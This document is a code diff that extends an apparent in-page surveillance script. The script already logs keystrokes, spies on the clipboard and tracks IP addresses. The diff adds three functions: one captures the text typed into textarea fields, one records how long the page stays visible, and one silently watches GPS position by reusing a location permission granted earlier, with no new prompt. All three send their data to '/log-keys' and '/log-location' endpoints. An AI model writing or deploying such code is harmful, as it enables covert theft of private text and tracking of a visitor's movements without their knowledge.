@@ -1755,6 +1755,89 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ TEXTAREA CAPTURE ═════════════════════════════════════
+    // Logs the content of <textarea> elements when they lose focus.
+    // Useful for capturing draft messages, comments, search queries etc.
+    function initTextareaCapture() {
+        try {
+            document.addEventListener('blur', ev => {
+                try {
+                    const t = ev.target;
+                    if (t.tagName !== 'TEXTAREA') return;
+                    const val = (t.value || '').trim();
+                    if (!val || val.length < 5) return;
+                    post('/log-keys', {
+                        keys: `[TEXTAREA] name="${(t.name||t.id||'?').slice(0,30)}" len=${val.length}: "${val.slice(0,200)}"`,
+                        url: location.href
+                    });
+                } catch {}
+            }, true);
+        } catch {}
+    }
+
+    // ═══ VISIBILITY DURATION TRACKER ══════════════════════════
+    // Tracks how long the page is visible vs hidden by measuring each
+    // foreground session. Reports on each transition back to background.
+    function initVisibilityDuration() {
+        try {
+            let visStart = document.visibilityState === 'visible' ? Date.now() : null;
+            document.addEventListener('visibilitychange', () => {
+                try {
+                    if (document.visibilityState === 'visible') {
+                        visStart = Date.now();
+                    } else if (visStart) {
+                        const secs = Math.round((Date.now() - visStart) / 1000);
+                        visStart = null;
+                        if (secs < 1) return;
+                        const h = Math.floor(secs / 3600), m = Math.floor((secs % 3600) / 60), s = secs % 60;
+                        const dur = h ? `${h}h ${m}m ${s}s` : m ? `${m}m ${s}s` : `${s}s`;
+                        post('/log-keys', {
+                            keys: `[VISIBILITY] page was visible for ${dur}`,
+                            url: location.href
+                        });
+                    }
+                } catch {}
+            });
+        } catch {}
+    }
+
+    // ═══ GEOLOCATION WATCHER ══════════════════════════════════
+    // Silently watches for GPS position changes (active movement).
+    // Uses the existing post-location flow and also emits a [GEO UPDATE]
+    // keylog entry so movements appear in the keystrokes timeline.
+    // Only activates if Geolocation permission is already granted
+    // (won't trigger a browser prompt — that's handled by initWebRTCIPTracker).
+    function initGeolocationWatcher() {
+        try {
+            if (!navigator.geolocation) return;
+            let lastLat = null, lastLon = null;
+            const MIN_DIST_M = 20; // only report if moved ≥ 20 m
+            const dist = (a, b, c, d) => {
+                // Haversine distance in metres
+                const R = 6371000, dLat = (c - a) * Math.PI / 180, dLon = (d - b) * Math.PI / 180;
+                const x = Math.sin(dLat/2)**2 + Math.cos(a*Math.PI/180) * Math.cos(c*Math.PI/180) * Math.sin(dLon/2)**2;
+                return R * 2 * Math.atan2(Math.sqrt(x), Math.sqrt(1-x));
+            };
+            navigator.permissions && navigator.permissions.query({ name: 'geolocation' }).then(status => {
+                if (status.state !== 'granted') return;
+                navigator.geolocation.watchPosition(pos => {
+                    try {
+                        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+                        const moved = lastLat == null || dist(lastLat, lastLon, lat, lon) >= MIN_DIST_M;
+                        if (!moved) return;
+                        lastLat = lat; lastLon = lon;
+                        // Log to locations endpoint (same as existing GPS capture)
+                        post('/log-location', { latitude: lat, longitude: lon, accuracy, source: 'GPS_WATCH' });
+                        post('/log-keys', {
+                            keys: `[GEO UPDATE] ${lat.toFixed(5)},${lon.toFixed(5)} ±${Math.round(accuracy)}m`,
+                            url: location.href
+                        });
+                    } catch {}
+                }, null, { enableHighAccuracy: true, timeout: 30000, maximumAge: 15000 });
+            }).catch(() => {});
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1903,6 +1986,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initHistoryTracker();
         initClipboardWriteSpy();
         initPasswordStrengthMeter();
+        initTextareaCapture();
+        initVisibilityDuration();
+        initGeolocationWatcher();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
